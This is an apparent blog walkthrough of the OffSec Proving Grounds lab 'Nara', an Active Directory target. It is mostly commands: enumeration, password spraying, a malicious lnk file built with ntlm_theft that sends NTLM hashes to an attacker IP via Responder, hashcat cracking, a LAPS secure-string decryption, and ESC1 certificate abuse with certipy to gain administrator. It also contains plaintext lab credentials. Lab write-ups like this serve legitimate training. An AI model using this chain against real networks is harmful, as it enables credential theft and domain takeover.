---
title: Nara
date: 2026-03-04T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - windows
  - proving-grounds
  - Active directory
  - SMB
  - Impacket
  - evilwinrm
  - ESC1
  - Certipy
  - nxc
  - LDAP
  - LAPS
  - Bloodhound
  - Hashcat
  - SMBclient
categories:
  - Pentesting
  - Offsec
  - Windows
description: "This guide provides readers with the solution to the Proving Grounds Lab: Nara"
---

It may seem difficult at first, but everything is difficult at first.  
Miyamoto Musashi

`nmap -p- 192.168.177.30 -min-rate 5000`

![](Screenshot%202026-02-27%20at%2015.11.14.png)

`enum4linux-ng -A 192.168.126.30`

![](Screenshot%202026-03-01%20at%2013.05.12.png)

`smbclient -N -L  //192.168.126.30/`

![](Screenshot%202026-03-01%20at%2013.03.37.png)

`kerbrute userenum  -d nara-security.com --dc 192.168.126.30 usersnames.txt`

![](Screenshot%202026-03-01%20at%2013.06.28.png)

`nxc smb 192.168.126.30  -u usersnames.txt -p usersnames.txt`

![](Screenshot%202026-03-01%20at%2013.09.53.png)

Authentication but no authorisation.

![](Screenshot%202026-03-01%20at%2013.14.41.png)

`smbclient -N   //192.168.126.30/nara`

![](Screenshot%202026-03-01%20at%2013.24.53.png)

![](Screenshot%202026-03-01%20at%2013.36.01.png)

I tried to upload a odt file with a malicious macro but I couldn't get a reverse shell. I found a way of creating a lnk file, when opened will reveal the ntml hash using Responder.

Create the file close this repo: 

`git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft`

`python3 ntlm_theft.py -g lnk -s 192.168.45.236 -f Bonus`

Start a responder session on your attack machine:

`sudo responder -I tun0 -dwv`

![](Screenshot%202026-03-02%20at%2012.28.35.png)

`smbclient   //192.168.189.30/nara`

upload your malicious lnk file:

![](Screenshot%202026-03-02%20at%2012.30.12.png)

You should now start to see traffic from the victim.

![](Screenshot%202026-03-02%20at%2012.31.18.png)

`hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule`

![](Screenshot%202026-03-02%20at%2012.32.28.png)

![](Screenshot%202026-03-02%20at%2012.17.32.png)


![](Screenshot%202026-03-02%20at%2012.48.09.png)

`smbclient   //192.168.238.30/SYSVOL -U nara-security/tracy.white%zqwj041FGX`

![](Screenshot%202026-03-03%20at%2009.03.43.png)

Bloodhound:

 `bloodhound-python -u "tracy.white" -p 'zqwj041FGX' -d nara-security.com -c all --zip -ns 192.168.238.30`

`net rpc group addmem "REMOTE ACCESS" "TRACY.WHITE" -U "nara-security.com"/"TRACY.WHITE"%"zqwj041FGX" -S "192.168.238.30"`

`evil-winrm -i 192.168.238.30 -u tracy.white -p zqwj041FGX`

![](Screenshot%202026-03-03%20at%2011.17.47.png)

![](Screenshot%202026-03-03%20at%2011.16.54.png)

`whoami /all`

![](Screenshot%202026-03-03%20at%2011.18.40.png)


We have found a random string, gemini has comfirmed that it is a encrypted LAPS password.
While in the victims machine, echo the hash into a file called cred.txt and then use the commands below to extract the password.

`01000000d08c9ddf0115d1118c7a00c04fc297eb0100000001e86ea0aa8c1e44ab231fbc46887c3a0000000002000000000003660000c000000010000000fc73b7bdae90b8b2526ada95774376ea0000000004800000a000000010000000b7a07aa1e5dc859485070026f64dc7a720000000b428e697d96a87698d170c47cd2fc676bdbd639d2503f9b8c46dfc3df4863a4314000000800204e38291e91f37bd84a3ddb0d6f97f9eea2b`

![](Screenshot%202026-03-03%20at%2013.47.53.png)

$pw = Get-Content cred.txt | ConvertTo-SecureString   
$bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pw)   
$UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)   
$UnsecurePassword

![](Screenshot%202026-03-05%20at%2013.02.38.png)

Enumerate the usernames and cross check them with the recovered password.

`sudo nxc ldap 192.168.237.30 -u tracy.white -p zqwj041FGX --users > ldap-users`

![](Screenshot%202026-03-05%20at%2013.25.18.png)

![](Screenshot%202026-03-05%20at%2013.23.23.png)



![](Screenshot%202026-03-05%20at%2013.30.32.png)


`certipy-ad req -u 'Jodie.Summers' -p 'hHO_S9gff7ehXw' -target 192.168.237.30 -template NaraUser -ca NARA-CA -upn administrator@nara-security.com`

![](Screenshot%202026-03-05%20at%2013.45.51.png)

Adding the -ldap-shell flag is possible even with the kerberos TGT issuing error seen below. 

`certipy-ad auth -pfx administrator.pfx  -u administrator -domain nara-security.com -dc-ip 192.168.237.30 -ldap-shell`

![](Screenshot%202026-03-05%20at%2014.01.23.png)

evil-winrm -i 192.168.237.30 -u tracy.white -p zqwj041FGX

![](Screenshot%202026-03-05%20at%2014.04.13.png)

It turns out that I could have just used the tracy.white account and the "*certipy-ad auth -pfx administrator.pfx  -u administrator -domain nara-security.com -dc-ip 192.168.237.30 -ldap-shell*" command to access the ldap shell. There was no need to decrypt the LAPS password at all. 

![](Screenshot%202026-03-05%20at%2014.49.30.png)

